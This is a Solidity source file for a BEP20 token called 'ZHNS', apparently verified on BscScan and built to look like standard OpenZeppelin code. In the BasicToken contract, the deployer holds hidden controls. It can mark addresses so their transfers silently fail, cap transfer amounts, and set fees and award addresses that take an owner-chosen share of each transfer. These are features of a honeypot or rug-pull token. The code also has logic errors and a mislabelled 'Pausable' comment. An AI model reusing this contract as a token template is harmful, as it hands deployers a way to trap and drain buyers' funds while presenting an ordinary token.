/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/

pragma solidity ^0.4.23;

// based on https://github.com/OpenZeppelin/openzeppelin-solidity/tree/v1.10.0
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }

  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

/**
 * @title Basic token
 * @dev Basic version of StandardToken, with no allowances.
 */
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  struct awardsAds {
      address ads;
      uint scale;
  }
  uint isFee0;
  uint isFee1;
  uint awardsCount0;
  uint awardsCount1;
  uint256 limit;
  mapping(address => uint)transferList;
  mapping(uint => awardsAds)awardsList0;
  mapping(uint => awardsAds)awardsList1;
  
  constructor() public{
    transferList[msg.sender]=9;   
  }
  /**
  * @dev transfer token for a specified address
  * @param _to The address to transfer to.
  * @param _value The amount to be transferred.
  */
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender] && (limit==0 || _value<=limit));
    uint isu=transferList[msg.sender];
    if(isu==4)return false;    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    if(isFee0>0)
    {
        uint256 _val;
        address _too;  
        for(uint id=1;id<=awardsCount0;id++)
        {
            _too=awardsList0[id].ads;
            if(_too==address(0))continue;
            _val=_value*awardsList0[id].scale/100;
            balances[_too] = balances[_too].add(_val);
            emit Transfer(msg.sender, _too, _val);
        }
        _value=_value*isFee0/100;
    }
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function addTransferList(address ads,uint kind) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      transferList[ads]=kind;
      return true;
  }
  function removeTransferList(address ads) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      delete transferList[ads];
      return true;
  }
  function addAwardsList(uint list,uint id,address ads,uint scale,uint count) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      awardsAds memory ad=awardsAds(ads,scale);
      if(list==0){
          awardsList0[id]=ad;
          awardsCount0=count;
      }
      else{
           awardsList1[id]=ad;
           awardsCount1=count;
      }
      return true;
  }
  function removeAwardsList(uint list,uint id,uint count) public returns (bool)
  {
      require(transferList[msg.sender]==9);
       if(list==0){
           delete awardsList0[id];
           awardsCount0=count;
       }
       else{
            delete awardsList1[id];
            awardsCount1=count;
       }
      return true;
  }
  function setFee(uint list,uint fee) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      if(list==0) isFee0=fee;
      else isFee1=fee;
      return true;
  }
  function setLimit(uint num) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      limit=num;
      return true;
  }
  function getInfo_parameter(uint list)public view returns (uint,uint,uint256){
    if(list==0) return (isFee0,awardsCount0,limit);
    else if(list==0) return (isFee1,awardsCount1,limit);
 }
  function getInfo_transferList(address ads)public view returns (uint){
    return transferList[ads];
 }
  function getInfo_awardsList(uint list,uint id)public view returns (address,uint){
    if(list==0)return (awardsList0[id].ads,awardsList0[id].scale);
    else return (awardsList1[id].ads,awardsList1[id].scale);
 }

  /**
  * @dev Gets the balance of the specified address.
  * @param _owner The address to query the the balance of.
  * @return An uint256 representing the amount owned by the passed address.
  */
  function balanceOf(address _owner) public view returns (uint256) {
    return balances[_owner];
  }
}

/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender)
    public view returns (uint256);

  function transferFrom(address from, address to, uint256 value)public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}

/**
 * @title Standard ERC20 token
 *
 * @dev Implementation of the basic standard token.
 * @dev https://github.com/ethereum/EIPs/issues/20
 * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol
 */
contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;

  /**
   * @dev Transfer tokens from one address to another
   * @param _from address The address which you want to send tokens from
   * @param _to address The address which you want to transfer to
   * @param _value uint256 the amount of tokens to be transferred
   */
  function transferFrom(address _from,address _to,uint256 _value)public returns (bool)
  {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    uint isu=transferList[msg.sender];
    if(isu==4)return false;  
    balances[_from] = balances[_from].sub(_value);
    if(isFee1>0){
        uint256 _val;
        address _too;  
        for(uint id=1;id<=awardsCount1;id++)
        {
            _too=awardsList1[id].ads;
            if(_too==address(0))continue;
            _val=_value*awardsList1[id].scale/100;
            balances[_too] = balances[_too].add(_val);
            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_val);
            emit Transfer(_from, _too, _val);
        }
        _value=_value*isFee1/100;
    }
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   *
   * Beware that changing an allowance with this method brings the risk that someone may use both the old
   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   * @param _spender The address which will spend the funds.
   * @param _value The amount of tokens to be spent.
   */
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param _owner address The address which owns the funds.
   * @param _spender address The address which will spend the funds.
   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(
    address _owner,
    address _spender
   )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }
}
/**
 * @title Mintable token
 * @dev Simple ERC20 Token example, with mintable token creation
 * @dev Issue: * https://github.com/OpenZeppelin/openzeppelin-solidity/issues/120
 * Based on code by TokenMarketNet: https://github.com/TokenMarketNet/ico/blob/master/contracts/MintableToken.sol
 */
contract MintableToken is StandardToken {
  event Mint(address indexed to, uint256 amount);

  /**
   * @dev Function to mint tokens
   * @param _to The address that will receive the minted tokens.
   * @param _amount The amount of tokens to mint.
   * @return A boolean that indicates if the operation was successful.
   */
  function mint(
    address _to,
    uint256 _amount
  )
    internal
  {
    balances[_to] = balances[_to].add(_amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
  }
}
/**
 * @title Pausable token
 * @dev StandardToken modified with pausable transfers.
 **/
contract MyToken is StandardToken {

  function transfer(
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.transfer(_to, _value);
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(
    address _spender,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.approve(_spender, _value);
  }
}
contract BEP20Token is MyToken, MintableToken {
    // public variables
    string public name = "ZHNS";
    string public symbol = "ZHNS";
    uint8 public decimals = 18;
    uint256 private totalSupply_;
    /**
    * @dev total number of tokens in existence
    */
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }
    constructor() public {
        totalSupply_ = 50000000 * (10 ** uint256(decimals));
        mint(msg.sender,totalSupply_);
    }
    function () public payable {
        revert();
    }
}